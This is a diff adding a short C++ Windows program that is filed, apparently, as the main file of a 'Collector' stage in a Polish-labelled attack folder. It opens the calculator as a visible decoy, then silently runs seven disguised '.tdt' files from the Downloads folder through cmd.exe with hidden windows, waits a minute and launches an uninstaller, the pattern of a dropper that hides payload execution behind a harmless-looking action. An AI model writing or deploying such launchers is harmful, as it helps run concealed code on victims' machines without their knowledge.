@@ -1,0 +1,33 @@
+---
+title: "Główny plik"
+folder: "Całe Ataki/2. Collector"
+---
+
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+void OpenCalc() {
+    if (ShellExecuteW(NULL, L"open", L"C:\\Windows\\System32\\calc.exe", NULL, NULL, SW_SHOWNORMAL) <= (HINSTANCE)32) {}
+}
+
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    OpenCalc();
+    WinExec("C:\\Windows\\System32\\cmd.exe /c C:\\Users\\User\\Downloads\\data1.tdt", 0);
+    WinExec("C:\\Windows\\System32\\cmd.exe /c C:\\Users\\User\\Downloads\\data2.tdt", 0);
+    WinExec("C:\\Windows\\System32\\cmd.exe /c C:\\Users\\User\\Downloads\\data3.tdt", 0);
+    WinExec("C:\\Windows\\System32\\cmd.exe /c C:\\Users\\User\\Downloads\\data4.tdt", 0);
+    WinExec("C:\\Windows\\System32\\cmd.exe /c C:\\Users\\User\\Downloads\\data5.tdt", 0);
+    WinExec("C:\\Windows\\System32\\cmd.exe /c C:\\Users\\User\\Downloads\\data6.tdt", 0);
+    WinExec("C:\\Windows\\System32\\cmd.exe /c C:\\Users\\User\\Downloads\\data7.tdt", 0);
+    Sleep(60000);
+    WinExec("C:\\Windows\\System32\\cmd.exe /c C:\\Users\\User\\Downloads\\uninstall.exe", 0);
+    
+    return 0;
+}
